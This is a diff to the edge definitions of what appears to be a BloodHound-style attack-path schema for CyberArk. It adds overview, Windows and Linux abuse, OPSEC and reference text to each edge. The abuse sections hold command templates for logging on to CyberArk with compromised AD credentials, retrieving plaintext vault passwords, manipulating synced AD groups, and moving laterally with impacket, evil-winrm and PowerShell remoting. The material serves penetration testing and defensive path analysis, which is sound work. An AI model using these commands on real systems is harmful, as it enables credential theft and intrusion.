       "description": "The source account's privileged sessions are managed and recorded by the target PSM server, inferred from the account's platform PSM configuration. Infrastructure mapping rather than a direct access path.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nInitiate a PSM-brokered SSH session:\n\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/PSMConnect\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"Reason\":\"authorized\",\"ConnectionComponent\":\"PSM-SSH\"}'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "All PSM-brokered sessions are logged with full session metadata and content recording. The end user never receives the plaintext credential — authentication to the target system is performed internally by PSM. Session recordings are stored in the CyberArk Session Recording vault and can be reviewed by administrators."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source account's privileged sessions are managed and recorded by the target PSM server, inferred from the account's platform PSM configuration. This edge directly links a specific account to its session recording infrastructure, identifying which PSM server processes connections to that account's target system."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/psm-connect.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nCompromising the PSM server identified by this edge grants the ability to intercept sessions for this specific account. All connections to the target system using this account are proxied through the PSM server:\n\n# To initiate a PSM-brokered session to this account's target system:\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n$body = @{Reason = 'authorized'; ConnectionComponent = 'PSM-RDP'} | ConvertTo-Json\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/PSMConnect\" `\n    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_HasConnectionComponent",
       "description": "The source platform has the target connection component enabled, defining the session protocols (RDP, SSH, etc.) available for accounts on the platform.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nSSH connection components enable shell access to Unix/Linux targets through PSM for SSH (PSMP):\n\n# Initiate SSH session via PSMP using the PSM-SSH connection component\n# Syntax: ssh <user>@<pvwa-or-psmp-host> -p <port>\n# PSMP intercepts the connection and authenticates to the target using the vault credential\n\n# Or via REST API:\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/PSMConnect\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"Reason\":\"authorized\",\"ConnectionComponent\":\"PSM-SSH\"}'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "All connection component sessions are fully logged and recorded by PSM. Session recordings include keystroke logging and screen capture depending on platform configuration. The type of connection component reveals target system types: RDP implies Windows systems, SSH implies Unix/Linux or network devices."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source platform has the target connection component enabled, defining the session protocols available for accounts on this platform. Common connection components include PSM-RDP (Remote Desktop), PSM-SSH (Secure Shell), PSM-Telnet, PSM-WebApp, and custom components. The enabled property indicates if the component is currently active. This determines which protocols an attacker can use when initiating PSM-brokered sessions through CyberArk_HasAccessTo edges."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/cc-about-connection-components.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/psm-connect.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nRDP connection components (e.g. PSM-RDP, PSM-RDP-LCL) enable interactive desktop sessions to Windows target systems without exposing the plaintext password:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# Initiate RDP session via PSM (requires useAccounts permission on the account)\n$body = @{Reason = 'authorized'; ConnectionComponent = 'PSM-RDP'} | ConvertTo-Json\n$rdpFile = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/PSMConnect\" `\n    -Method POST -Headers $headers -Body $body -ContentType 'application/json'\n# The response contains an RDP file or redirect URL to launch the session\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_PSMServerHostedOn",
       "description": "The source PSM server runs on the target Active Directory computer (matched by the PSM server address). Cross-domain correlation linking PSM infrastructure to its underlying host.",
-      "is_traversable": false
+      "is_traversable": false,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nFor PSM for SSH (PSMP) the host is Linux; landing on it exposes the SSH session broker and its logs:\n\nls /opt/CARKpsmp/\nls /var/opt/CARKpsmp/logs/\ncat /etc/opt/CARKpsmp/basic_psmpserver.conf\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "PSM hosts are high-value and typically hardened and heavily monitored; interactive access to them is conspicuous. The correlation is inferred by name/address match and may be approximate — verify the mapping before relying on it. All sessions brokered by the PSM remain fully logged and recorded regardless of host access."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk PSM server runs on the target Active Directory computer, inferred by matching the PSM server's configured address to a computer in a target domain. This cross-domain correlation edge bridges CyberArk session infrastructure to its underlying host, so the computer's Active Directory attack surface and the PSM server's session exposure can be reasoned about together."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/manage-psm-for-windows.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/the-psm-for-ssh.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nCompromising the underlying computer is equivalent to compromising the PSM server it hosts: every session the PSM brokers, and every recording it stages locally, becomes reachable.\n\n# From the host, PSM for Windows stages recordings before transfer:\n# C:\\ProgramData\\CyberArk\\PSM\\Sessions\\\n# Pivot to the host via its normal Windows attack surface (RDP, WinRM, SMB),\n# then follow this PSM server's CyberArk_ManagedByPSM / CyberArk_UsesPSMServer edges\n# to see exactly which accounts and platforms route their sessions through it.\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_SyncsToUser",
       "description": "The source Active Directory user is synchronized to the target CyberArk Vault user via LDAP directory integration. Compromising the AD user grants access to all CyberArk resources of the synced Vault user.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nAuthenticate to PVWA using compromised AD credentials via LDAP auth:\n\nTOKEN=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Auth/LDAP/Logon\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"DOMAIN\\\\<user>\",\"password\":\"<compromised-password>\"}' | tr -d '\"')\n\n# List accessible safes\ncurl -s \"https://<pvwa>/PasswordVault/API/Safes\" -H \"Authorization: Bearer $TOKEN\"\n\n# Retrieve credentials from accessible accounts\ncurl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" -d '{}'\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "LDAP-based authentication to CyberArk PVWA generates login events in both Active Directory (Kerberos TGT/TGS requests or NTLM authentication — Event IDs 4768, 4769, 4776) and in the CyberArk Vault audit trail (login event under the Vault username). Failed authentication attempts may trigger AD account lockout if threshold policies are configured. The CyberArk PVWA web application firewall may also log and alert on unusual authentication patterns."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source Active Directory user is synchronized to the target CyberArk Vault user via LDAP directory integration. The AD user's identity and credentials are mapped directly to the CyberArk user — if LDAP authentication is configured on the PVWA, the AD user's password (or Kerberos ticket) authenticates them to CyberArk without a separate Vault password. This edge bridges the AD and CyberArk attack surfaces: compromising the AD user grants full access to all CyberArk safes and accounts the Vault user is a member of."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/ldap-integration.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-ldap-authentication.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nAfter compromising the AD user account (via Kerberoasting, AS-REP roasting, credential theft, pass-the-hash, etc.), authenticate to CyberArk PVWA using LDAP authentication:\n\n$pvwaURL = 'https://<pvwa>'\n# Authenticate using compromised AD credentials (LDAP auth method)\n$body = @{username = 'DOMAIN\\<user>'; password = '<compromised-password>'} | ConvertTo-Json\n$token = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Auth/LDAP/Logon\" `\n    -Method POST -Body $body -ContentType 'application/json'\n\n# Now use $token to access all CyberArk resources of the synced Vault user\n$headers = @{Authorization = \"Bearer $token\"}\n# List accessible safes\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Safes\" -Headers $headers\n# Retrieve credentials from accessible accounts\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_SyncsToGroup",
       "description": "The source Active Directory group is synchronized to the target CyberArk Vault group via LDAP directory integration. Adding a member to the AD group propagates the Vault group's safe permissions after the next sync.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nAdd a user to the AD group via LDAP modification or Samba tools:\n\n# Using net rpc (requires credentials for a group admin)\nnet rpc group addmem '<AD-Group-Name>' '<compromised-user>' -U '<admin-user>' -S '<dc-host>'\n\n# Using ldapmodify\nldapmodify -x -H ldap://<dc-host> -D 'CN=admin,DC=domain,DC=com' -w '<password>' << EOF\ndn: CN=<AD-Group-Name>,OU=Groups,DC=domain,DC=com\nchangetype: modify\nadd: member\nmember: CN=<compromised-user>,OU=Users,DC=domain,DC=com\nEOF\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "AD group membership changes are logged in Active Directory security events: Event ID 4728 (member added to global security group), 4732 (member added to local security group), or 4756 (member added to universal security group). CyberArk LDAP sync has a configurable interval (often 5–60 minutes) — the privilege change may not take effect immediately in CyberArk. The corresponding CyberArk permission change may not generate a Vault audit event until the sync occurs, creating a window where the AD change exists but CyberArk access has not yet been updated."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source Active Directory group is synchronized to the target CyberArk Vault group via LDAP directory integration. AD group membership changes automatically propagate to CyberArk group membership after each LDAP sync cycle, meaning that adding an account to the AD group grants it all CyberArk safe permissions assigned to the corresponding Vault group — without making any direct changes inside CyberArk. This is a stealthy privilege escalation path through AD group manipulation."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/ldap-integration.htm>\n- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/pasimp/configuring-directory-mappings.htm>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nAdd a compromised or controlled AD user to the synchronized AD group to inherit the CyberArk group's safe permissions:\n\n# Add user to the AD group (requires AD permissions to modify the group)\nAdd-ADGroupMember -Identity '<AD-Group-Name>' -Members '<compromised-user>'\n\n# After the next CyberArk LDAP sync, the user will have all safe permissions of the CyberArk group\n# LDAP sync interval is configurable — check CyberArk LDAP integration settings\n# Force sync (if you have PVWA admin access):\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $adminToken\"}\nInvoke-RestMethod -Uri \"$pvwaURL/PasswordVault/WebServices/PIMServices.svc/Users/SyncFromDirectory\" `\n    -Method POST -Headers $headers\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_SyncsToADUser",
       "description": "The source CyberArk account stores credentials for the target Active Directory user (inferred by username/domain match). Retrieving the credential yields the plaintext password for direct AD authentication and lateral movement.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nRetrieve the credential and use for AD lateral movement with Linux tools:\n\n# Retrieve credential from CyberArk\nPASSWORD=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}' | tr -d '\"')\n\n# Kerberos authentication\necho \"$PASSWORD\" | kinit <adUser>@<DOMAIN.COM>\n\n# SMB / lateral movement with Impacket\nimpacket-psexec '<domain>/<adUser>:<password>@<target>'\nimpacket-wmiexec '<domain>/<adUser>:<password>@<target>'\n\n# WinRM\nevil-winrm -i <target> -u <adUser> -p \"$PASSWORD\" -d <domain>\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "Password retrieval from CyberArk is logged in the Vault audit trail under the requesting user's identity. Subsequent use of the retrieved credential in Active Directory generates standard Windows authentication events: Event ID 4624 (successful logon), 4625 (failed logon), 4768/4769 (Kerberos TGT/TGS requests), or 4776 (NTLM authentication). Unusual authentication from unexpected source IPs or outside normal business hours — correlated with a prior CyberArk retrieval event — may indicate credential exfiltration."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk account stores credentials for the target Active Directory user account. This relationship is inferred: the account's stored username matches an AD sAMAccountName or UPN in a target domain. Retrieving this credential from CyberArk yields the plaintext password for the AD user, enabling direct AD authentication and lateral movement across the domain. This is a cross-domain bridge edge from the CyberArk attack surface into Active Directory."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/getaccountpasswordvalue.htm>\n- <https://attack.mitre.org/techniques/T1555/>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nRetrieve the AD user's plaintext password from CyberArk, then use it for AD lateral movement:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# Retrieve the credential (requires retrieveAccounts permission on the safe)\n$password = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n\n# Use retrieved credentials for AD authentication\n$secPass = ConvertTo-SecureString $password -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('<domain>\\<adUser>', $secPass)\n\n# Lateral movement options:\nInvoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami; hostname}\nEnter-PSSession -ComputerName <target> -Credential $cred\n# Or use with PsExec, WMI, RDP, etc.\n```"
+          }
+        }
+      }
     },
     {
       "name": "CyberArk_CanConnect",
       "description": "The source CyberArk account stores credentials valid for authenticating to the target Active Directory computer (inferred by address/domain match), often a local administrator credential. Enables direct lateral movement to the host.",
-      "is_traversable": true
+      "is_traversable": true,
+      "info": {
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "```bash\nRetrieve the credential and use Impacket or other tools for lateral movement:\n\n# Retrieve credential\nPASSWORD=$(curl -s -X POST \"https://<pvwa>/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}' | tr -d '\"')\n\n# Impacket lateral movement (local admin account)\nimpacket-psexec './<localUser>:$PASSWORD@<targetComputer>'\nimpacket-smbexec './<localUser>:$PASSWORD@<targetComputer>'\n\n# WinRM\nevil-winrm -i <targetComputer> -u <localUser> -p \"$PASSWORD\"\n\n# RDP\nxfreerdp /v:<targetComputer> /u:<localUser> /p:\"$PASSWORD\"\n```"
+          }
+        },
+        "opsec": {
+          "title": "OPSEC Considerations",
+          "position": 4,
+          "markdown": {
+            "content": "CyberArk password retrieval is logged in the Vault audit trail. Subsequent connection to the target computer generates Windows Security events: Event ID 4624 (logon), 4648 (explicit credential logon). Local administrator account usage is particularly visible in endpoint detection and response (EDR) solutions and may trigger privileged account alerts. Pass-the-hash using the retrieved credential NTLM hash (if not rotating) may allow authentication without the plaintext password."
+          }
+        },
+        "overview": {
+          "title": "Overview",
+          "position": 1,
+          "markdown": {
+            "content": "The source CyberArk account stores credentials valid for authenticating to the target Active Directory computer. This relationship is inferred: the account's address field matches a hostname or IP that is part of the target domain. If localUser is true in the edge properties, the account stores a local (non-domain) credential for that specific machine, potentially including local administrator access. Retrieving this credential enables direct lateral movement to the target computer."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- <https://docs.cyberark.com/pam-self-hosted/latest/en/content/sdk/getaccountpasswordvalue.htm>\n- <https://attack.mitre.org/techniques/T1078/003/>"
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "```powershell\nRetrieve the local or machine account credential from CyberArk, then connect to the target computer:\n\n$pvwaURL = 'https://<pvwa>'\n$headers = @{Authorization = \"Bearer $token\"}\n# Retrieve the credential\n$password = Invoke-RestMethod -Uri \"$pvwaURL/PasswordVault/API/Accounts/<accountId>/Password/Retrieve\" `\n    -Method POST -Headers $headers -Body '{}' -ContentType 'application/json'\n\n$secPass = ConvertTo-SecureString $password -AsPlainText -Force\n# For local account (localUser=true), prefix username with the machine name or '.'\n$cred = New-Object System.Management.Automation.PSCredential('.\\<localUser>', $secPass)\n\n# Connect to target computer\nInvoke-Command -ComputerName <targetComputer> -Credential $cred -ScriptBlock {whoami}\n# RDP\ncmdkey /add:<targetComputer> /user:'.\\<localUser>' /pass:'<password>'\nmstsc /v:<targetComputer>\n```"
+          }
+        }
+      }
     }
   ],
   "environments": [
